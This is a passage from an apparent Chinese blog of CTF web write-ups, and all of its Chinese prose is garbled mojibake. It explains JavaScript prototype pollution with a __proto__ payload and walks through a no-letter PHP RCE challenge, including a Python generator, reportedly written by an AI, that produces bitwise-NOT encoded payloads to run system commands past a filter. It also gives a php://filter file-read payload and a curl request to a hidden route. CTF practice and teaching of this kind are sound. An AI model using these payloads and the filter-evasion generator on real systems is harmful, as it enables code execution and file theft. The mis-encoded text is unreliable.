<h3 id="3-proto-çš„ä½œç”¨"><a href="#3-proto-çš„ä½œç”¨" class="headerlink" title="3. __proto__ çš„ä½œç”¨"></a><strong>3. <code>__proto__</code> çš„ä½œç”¨</strong></h3><p><code>__proto__</code> æ˜¯å¯¹è±¡çš„ä¸€ä¸ª<strong>éšè—å±æ€§</strong>ï¼ˆç°åœ¨æ›´æ¨èç”¨ <code>Object.getPrototypeOf()</code> è·å–ï¼‰ï¼Œå®ƒç›´æ¥æŒ‡å‘å¯¹è±¡çš„â€œçˆ¸çˆ¸â€ï¼ˆåŸå‹å¯¹è±¡ï¼‰ã€‚</p>
<h4 id="ä¸¾ä¸ªä¾‹å­ï¼š"><a href="#ä¸¾ä¸ªä¾‹å­ï¼š" class="headerlink" title="ä¸¾ä¸ªä¾‹å­ï¼š"></a><strong>ä¸¾ä¸ªä¾‹å­ï¼š</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå¯¹è±¡</span><br><span class="hljs-keyword">const</span> animal = &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&quot;åŠ¨ç‰©&quot;</span> &#125;;<br><span class="hljs-keyword">const</span> cat = &#123; <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;å–µå–µ&quot;</span> &#125;;<br><br><span class="hljs-comment">// æ‰‹åŠ¨è®¾ç½® cat çš„â€œçˆ¸çˆ¸â€æ˜¯ animal</span><br>cat.<span class="hljs-property">__proto__</span> = animal;<br><br><span class="hljs-comment">// è®¿é—® cat.type</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(cat.<span class="hljs-property">type</span>); <span class="hljs-comment">// è¾“å‡º &quot;åŠ¨ç‰©&quot;ï¼ˆä»â€œçˆ¸çˆ¸â€animalç»§æ‰¿ï¼‰</span><br></code></pre></td></tr></table></figure>
<ul>
<li><p><code>cat</code> è‡ªå·±æ²¡æœ‰ <code>type</code> å±æ€§ã€‚</p>
</li>
<li><p>ä½†å› ä¸º <code>cat.__proto__</code> æŒ‡å‘ <code>animal</code>ï¼Œæ‰€ä»¥ä¼šå» <code>animal</code> é‡Œæ‰¾ <code>type</code>ã€‚</p>
</li>
<li><p>è¿™å°±æ˜¯<strong>ç»§æ‰¿</strong>ï¼</p>
</li>
</ul>
<hr>
<h3 id="4-åŸå‹é“¾æ±¡æŸ“çš„åŸç†"><a href="#4-åŸå‹é“¾æ±¡æŸ“çš„åŸç†" class="headerlink" title="4. åŸå‹é“¾æ±¡æŸ“çš„åŸç†"></a><strong>4. åŸå‹é“¾æ±¡æŸ“çš„åŸç†</strong></h3><p>å‡è®¾æˆ‘ä»¬ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„â€œçˆ¸çˆ¸â€ï¼ˆåŸå‹å¯¹è±¡ï¼‰ï¼Œé‚£ä¹ˆ<strong>æ‰€æœ‰ç»§æ‰¿è¿™ä¸ªâ€œçˆ¸çˆ¸â€çš„å¯¹è±¡éƒ½ä¼šå—åˆ°å½±å“</strong>ï¼</p>
<h4 id="æ±¡æŸ“ç¤ºä¾‹ï¼š"><a href="#æ±¡æŸ“ç¤ºä¾‹ï¼š" class="headerlink" title="æ±¡æŸ“ç¤ºä¾‹ï¼š"></a><strong>æ±¡æŸ“ç¤ºä¾‹ï¼š</strong></h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs js">    <span class="hljs-comment">// æ™®é€šå¯¹è±¡</span><br>    <span class="hljs-keyword">const</span> obj1 = &#123;&#125;;<br>    <span class="hljs-keyword">const</span> obj2 = &#123;&#125;;<br>    <br>    <span class="hljs-comment">// æ±¡æŸ“ Object.prototypeï¼ˆæ‰€æœ‰å¯¹è±¡çš„â€œçˆ·çˆ·â€ï¼‰</span><br>    obj1.<span class="hljs-property">__proto__</span>.<span class="hljs-property">__proto__</span>.<span class="hljs-property">hacked</span> = <span class="hljs-string">&quot;è¢«æ±¡æŸ“äº†ï¼&quot;</span>;<br>    <br>    <span class="hljs-comment">// æ‰€æœ‰å¯¹è±¡éƒ½ä¼šç»§æ‰¿è¿™ä¸ªå±æ€§ï¼</span><br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(obj2.<span class="hljs-property">hacked</span>); <span class="hljs-comment">// è¾“å‡º &quot;è¢«æ±¡æŸ“äº†ï¼&quot;</span><br><br>*   <span class="hljs-string">`Object.prototype`</span> æ˜¯å‡ ä¹æ‰€æœ‰å¯¹è±¡çš„â€œçˆ·çˆ·â€ã€‚<br>    <br>*   ä¿®æ”¹å®ƒåï¼Œæ‰€æœ‰å¯¹è±¡ï¼ˆå¦‚ <span class="hljs-string">`obj2`</span>ï¼‰éƒ½ä¼šè‡ªåŠ¨ç»§æ‰¿ <span class="hljs-string">`hacked`</span> å±æ€§ã€‚<br>    <br></code></pre></td></tr></table></figure>
<hr>
<h3 id="5-å›åˆ°CTFé¢˜ç›®ä¸­çš„æ”»å‡»"><a href="#5-å›åˆ°CTFé¢˜ç›®ä¸­çš„æ”»å‡»" class="headerlink" title="5. å›åˆ°CTFé¢˜ç›®ä¸­çš„æ”»å‡»"></a><strong>5. å›åˆ°CTFé¢˜ç›®ä¸­çš„æ”»å‡»</strong></h3><p>é¢˜ç›®ä¸­çš„è¯·æ±‚æ•°æ®ï¼š</p>
<pre><code class="hljs">&#123;
  &quot;point&quot;: &#123;
    &quot;amount&quot;: 0,
    &quot;__proto__&quot;: &#123; &quot;amount&quot;: 10000 &#125;
  &#125;
&#125;
</code></pre>
<h4 id="æ”»å‡»æ­¥éª¤ï¼š"><a href="#æ”»å‡»æ­¥éª¤ï¼š" class="headerlink" title="æ”»å‡»æ­¥éª¤ï¼š"></a><strong>æ”»å‡»æ­¥éª¤ï¼š</strong></h4><ol>
<li><p><strong>è®¾ç½® <code>amount: 0</code></strong>ï¼šè§¦å‘åç«¯ä»£ç  <code>delete req.body.point.amount</code>ï¼Œåˆ é™¤å¯¹è±¡è‡ªèº«çš„ <code>amount</code>ã€‚</p>
</li>
<li><p><strong>é€šè¿‡ <code>__proto__</code> ä¿®æ”¹åŸå‹</strong>ï¼šå°† <code>point</code> å¯¹è±¡çš„â€œçˆ¸çˆ¸â€è®¾ç½®ä¸ºä¸€ä¸ªåŒ…å« <code>amount: 10000</code> çš„å¯¹è±¡ã€‚</p>
</li>
<li><p><strong>ç»§æ‰¿ä¼ªé€ çš„ <code>amount</code></strong>ï¼šå½“åç«¯æ£€æŸ¥ <code>point.amount</code> æ—¶ï¼Œç”±äºè‡ªèº«å±æ€§è¢«åˆ é™¤ï¼Œä¼šä»â€œçˆ¸çˆ¸â€é‚£é‡Œç»§æ‰¿ <code>amount: 10000</code>ï¼Œä»è€Œç»•è¿‡é™åˆ¶ã€‚</p>
</li>
</ol>
<hr>
<h3 id="6-ç±»æ¯”ç†è§£"><a href="#6-ç±»æ¯”ç†è§£" class="headerlink" title="6. ç±»æ¯”ç†è§£"></a><strong>6. ç±»æ¯”ç†è§£</strong></h3><p>æƒ³è±¡ä½ æœ‰ä¸€ä¸ªå®¶æ—ï¼š</p>
<ul>
<li><p><strong>ä½ è‡ªå·±</strong>ï¼šæœ‰ä¸€ä¸ªé’±åŒ…ï¼ˆå±æ€§ï¼‰ï¼Œä½†ä½ æŠŠé’±åŒ…æ‰”äº†ï¼ˆ<code>delete</code>ï¼‰ã€‚</p>
</li>
<li><p><strong>ä½ çš„çˆ¸çˆ¸</strong>ï¼šä½ å·å·ä¿®æ”¹äº†çˆ¸çˆ¸çš„é’±åŒ…ï¼Œå¾€é‡Œå¡äº†10000å…ƒï¼ˆé€šè¿‡ <code>__proto__</code> ä¿®æ”¹åŸå‹ï¼‰ã€‚</p>
</li>
<li><p><strong>åˆ«äººæ£€æŸ¥ä½ çš„è´¢äº§</strong>ï¼šå‘ç°ä½ æ²¡é’±åŒ…ï¼Œäºæ˜¯çœ‹ä½ çˆ¸çˆ¸çš„é’±åŒ…ï¼Œè®¤ä¸ºä½ æœ‰10000å…ƒï¼</p>
</li>
</ul>
<hr>
<h3 id="æ€»ç»“-1"><a href="#æ€»ç»“-1" class="headerlink" title="æ€»ç»“"></a><strong>æ€»ç»“</strong></h3><ul>
<li><p><code>__proto__</code> æ˜¯å¯¹è±¡è®¿é—®â€œçˆ¸çˆ¸â€ï¼ˆåŸå‹ï¼‰çš„å…¥å£ã€‚</p>
</li>
<li><p><strong>åŸå‹é“¾æ±¡æŸ“</strong>å°±æ˜¯é€šè¿‡ä¿®æ”¹â€œçˆ¸çˆ¸â€çš„å±æ€§ï¼Œå½±å“æ‰€æœ‰â€œå„¿å­â€å¯¹è±¡ã€‚</p>
</li>
<li><p>åœ¨CTFä¸­ï¼Œæ”»å‡»è€…åˆ©ç”¨è¿™ä¸€ç‚¹ä¼ªé€ æ•°æ®ï¼Œç»•è¿‡é€»è¾‘æ£€æŸ¥ã€‚</p>
</li>
</ul>
<p>è¿™æ ·è§£é‡Šæ¸…æ¥šäº†å—ï¼Ÿå¦‚æœè¿˜æœ‰ç–‘é—®ï¼Œå¯ä»¥éšæ—¶é—®æˆ‘ï¼ ğŸ˜Š</p>
<hr>
<h2 id="title-note-36date-2025-05-24-23-36-51tags-web"><a href="#title-note-36date-2025-05-24-23-36-51tags-web" class="headerlink" title="title: note-36date: 2025-05-24 23:36:51tags: web"></a>title: note-36<br>date: 2025-05-24 23:36:51<br>tags: web</h2><h1 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-hardrce" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]hardrce</h1><p>å¼€å±€ç»™æºç ï¼Œåªçœ‹ä¸€çœ¼  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$wllm</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;wllm&#x27;</span>];<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;\t&#x27;</span>,<span class="hljs-string">&#x27;\r&#x27;</span>,<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\+&#x27;</span>,<span class="hljs-string">&#x27;\[&#x27;</span>,<span class="hljs-string">&#x27;\^&#x27;</span>,<span class="hljs-string">&#x27;\]&#x27;</span>,<span class="hljs-string">&#x27;\&quot;&#x27;</span>,<span class="hljs-string">&#x27;\-&#x27;</span>,<span class="hljs-string">&#x27;\$&#x27;</span>,<span class="hljs-string">&#x27;\*&#x27;</span>,<span class="hljs-string">&#x27;\?&#x27;</span>,<span class="hljs-string">&#x27;\&lt;&#x27;</span>,<span class="hljs-string">&#x27;\&gt;&#x27;</span>,<span class="hljs-string">&#x27;\=&#x27;</span>,<span class="hljs-string">&#x27;\`&#x27;</span>,];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$wllm</span>)) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;LTLTè¯´ä¸èƒ½ç”¨è¿™äº›å¥‡å¥‡æ€ªæ€ªçš„ç¬¦å·å“¦ï¼&quot;</span>);<br>    &#125;&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/is&#x27;</span>,<span class="hljs-variable">$wllm</span>))<br>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Ra&#x27;s Al Ghulè¯´ä¸èƒ½ç”¨å­—æ¯å“¦ï¼&quot;</span>);<br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;NoVic4è¯´ï¼šä¸é”™å“¦å°ä¼™å­ï¼Œå¯ä½ èƒ½æ‹¿åˆ°flagå—ï¼Ÿ&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$wllm</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> è”¡æ€»è¯´ï¼šæ³¨æ„å®¡é¢˜ï¼ï¼ï¼<br></code></pre></td></tr></table></figure>
<p>è¿™éƒ½è¿‡æ»¤äº†å•¥ï¼Œç»™deepseekçœ‹çœ‹<br>då¯¼æ€è€ƒäº†å¾ˆä¹…ï¼Œç»™äº†å‡ ä¸ªpayloadï¼Œéƒ½æ— æ³•èµ·æ•ˆ  </p>
<p>ä¸Šç½‘ä¸€æ‰¾ï¼Œçœ‹æ¥è¿™ç§åº”è¯¥å«åšæ— å­—æ¯recï¼Œå¦‚åå­—ï¼Œå°±æ˜¯æ— æ³•ä¼ å…¥å­—æ¯å­—ç¬¦å•¥çš„<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pursue-security/p/15404150.html">https://www.cnblogs.com/pursue-security/p/15404150.html</a>  </p>
<p>æ•…å«då¯¼å¸®å†™äº†ä¸ªè„šæœ¬æ¥æ„é€ payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_neg_payload</span>(<span class="hljs-params">s</span>):<br>    payload = []<br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s:<br>        neg = (~<span class="hljs-built_in">ord</span>(c)) &amp; <span class="hljs-number">0xFF</span>  <span class="hljs-comment"># å–åå¹¶è½¬æ¢ä¸ºæ— ç¬¦å·å­—èŠ‚</span><br>        payload.append(<span class="hljs-string">f&quot;%<span class="hljs-subst">&#123;neg:02X&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_command</span>(<span class="hljs-params">cmd</span>):<br>    <span class="hljs-comment"># åŒ¹é… function(&#x27;argument&#x27;) æ ¼å¼</span><br>    pattern = <span class="hljs-string">r&#x27;^\s*?(\w+?)\s*?\(\s*?[\&#x27;&quot;](.*?)[\&#x27;&quot;]\s*?\)\s*?;?&#x27;</span><br>    <span class="hljs-keyword">match</span> = re.<span class="hljs-keyword">match</span>(pattern, cmd)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">match</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;å‘½ä»¤æ ¼å¼é”™è¯¯ï¼è¯·ä½¿ç”¨ function(&#x27;argument&#x27;) æ ¼å¼&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>), <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    cmd = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;è¯·è¾“å…¥PHPå‘½ä»¤ï¼ˆç¤ºä¾‹ï¼šsystem(&#x27;ls /&#x27;)ï¼š&quot;</span>).strip()<br>    <span class="hljs-keyword">try</span>:<br>        func, arg = parse_command(cmd)<br>        <br>        <span class="hljs-comment"># ç”Ÿæˆå‡½æ•°åå’Œå‚æ•°çš„å–åpayload</span><br>        func_neg = generate_neg_payload(func)<br>        arg_neg = generate_neg_payload(arg)<br>        <br>        payload = <span class="hljs-string">f&quot;(~<span class="hljs-subst">&#123;func_neg&#125;</span>)(~<span class="hljs-subst">&#123;arg_neg&#125;</span>);&quot;</span><br>        <br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nç”Ÿæˆçš„å–åPayloadï¼š&quot;</span>)<br>        <span class="hljs-built_in">print</span>(payload)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nä½¿ç”¨è¯´æ˜ï¼š&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. éœ€è¦ç›®æ ‡ç¯å¢ƒå¼€å¯çŸ­æ ‡ç­¾æ”¯æŒ&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. ç¡®ä¿PHPç‰ˆæœ¬æ”¯æŒè¿™ç§è°ƒç”¨æ–¹å¼&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. å®é™…ä½¿ç”¨æ—¶å¯èƒ½éœ€è¦URLç¼–ç æ•´ä¸ªpayload&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;4. ç¤ºä¾‹æœ€ç»ˆå½¢å¼ï¼š?code=~%8C%86%8C%8B%9A%92~%93%8C%DF%D0&quot;</span>)<br>        <br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;é”™è¯¯ï¼š<span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>

<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br>ç”Ÿæˆçš„å–åPayloadï¼š<br>(~%8C%86%8C%8B%9A%92)(~%93%8C);<br><br><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;ls /&#x27;</span>);<br>ç”Ÿæˆçš„å–åPayloadï¼š<br>(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);<br><br><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flllllaaaaaaggggggg&#x27;</span>); <br>ç”Ÿæˆçš„å–åPayloadï¼š<br>(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);<br></code></pre></td></tr></table></figure>

<h1 id="SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-ez-php"><a href="#SWPUCTF-2022-æ–°ç”Ÿèµ›-ez-ez-php" class="headerlink" title="[SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_ez_php"></a>[SWPUCTF 2022 æ–°ç”Ÿèµ›]ez_ez_php</h1><p>å¼€é¢˜ç»™æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">3</span>) === <span class="hljs-string">&quot;php&quot;</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Nice!!!&quot;</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <br><br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-comment">//flag.php</span><br></code></pre></td></tr></table></figure>
<p>æºç å¤§æ¦‚æ„æ€æ˜¯æœ‰ä¸ªsubstrå‡½æ•°æˆªå–fileä¼ å…¥å‚æ•°å‰3ä½ï¼Œæ‰€ä»¥å‰3ä½å¾—æ˜¯â€™phpâ€™ï¼Œè¿™ç›´æ¥å°±æ˜¯æç¤ºä¼ªåè®®äº†å•Š</p>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ceylon">NSSCTF&#123;flag<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_n</span>ot<span class="hljs-number">_</span>here&#125;<br>real<span class="hljs-number">_f</span>lag<span class="hljs-number">_</span><span class="hljs-keyword">is</span><span class="hljs-number">_</span><span class="hljs-keyword">in</span><span class="hljs-number">_</span><span class="hljs-string">&#x27;flag&#x27;</span><br>æ¢ä¸ªæ€è·¯ï¼Œè¯•è¯•PHPä¼ªåè®®å‘¢<br></code></pre></td></tr></table></figure>
<p>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag<br>æ‹¿åˆ°æ­£ç¡®flagï¼Œä½†æ˜¯å•Šä½†æ˜¯</p>
<p>å°½ç„¶ç›´æ¥è®¿é—®&#x2F;flag å°±èƒ½æ‹¿</p>
<h1 id="GDOUCTF-2023-EZ-WEB"><a href="#GDOUCTF-2023-EZ-WEB" class="headerlink" title="[GDOUCTF 2023]EZ WEB"></a>[GDOUCTF 2023]EZ WEB</h1><p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªå‡æŒ‰é’®ï¼Œæ‰«äº†ä¸€ä¸‹å‘ç°&#x2F;srcæœ‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">import</span> flask<br><br>app = flask.Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>) </span><span class="hljs-comment">## GET æ–¹å¼è®¿é—® / å°±è¿”å›index.html</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>  <span class="hljs-keyword">return</span> flask.send_file(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">source</span>():<br>  <span class="hljs-keyword">return</span> flask.send_file(<span class="hljs-string">&#x27;app.py&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/super-secret-route-nobody-will-guess&#x27;</span>, methods=[<span class="hljs-string">&#x27;PUT&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flag</span>():<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>).read()<br></code></pre></td></tr></table></figure>
<p>è€è§„çŸ©ï¼Œå…ˆé—®då¯¼  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X PUT http://node5.anna.nssctf.cn:28256/super-secret-route-nobody-will-guess<br></code></pre></td></tr></table></figure>
<p>ç›´æ¥è¿”å›flagï¼Œè¡Œï¼Œçœ‹çœ‹æºç <br>å¥½åƒæ˜¯è§„å®šäº†å‡ ä¸ªæ¡ä»¶  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## GET æ–¹å¼è®¿é—® / å°±è¿”å›index.html</span><br><span class="hljs-comment">## GET æ–¹å¼è®¿é—® /src å°±è¿”å› app.py</span><br><span class="hljs-comment">## PUT æ–¹å¼è®¿é—® /super-secret-route-nobody-will-guess å°±æ‰“å¼€flagï¼Œç„¶åreadå®ƒ</span><br></code></pre></td></tr></table></figure>
<p>é‚£æˆ‘çŒœè¿™å¯èƒ½æ˜¯ä¸€ä¸ªpythonåç«¯ï¼Ÿ<br>ä»¥å‰ä¹Ÿæ²¡è§è¿‡ï¼Œé‚£ç°åœ¨çŸ¥é“äº†</p>
<hr>
<h2 id="title-note-37date-2025-06-02-03-27-46tags"><a href="#title-note-37date-2025-06-02-03-27-46tags" class="headerlink" title="title: note-37date: 2025-06-02 03:27:46tags:"></a>title: note-37<br>date: 2025-06-02 03:27:46<br>tags:</h2><h1 id="Mini-L-CTF-miniup"><a href="#Mini-L-CTF-miniup" class="headerlink" title="Mini L-CTF miniup"></a>Mini L-CTF miniup</h1><p>åœ¨æŸ¥çœ‹å›¾ç‰‡å¤„ç›´æ¥æŸ¥çœ‹index.phpèƒ½å¾—åˆ°æºç   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 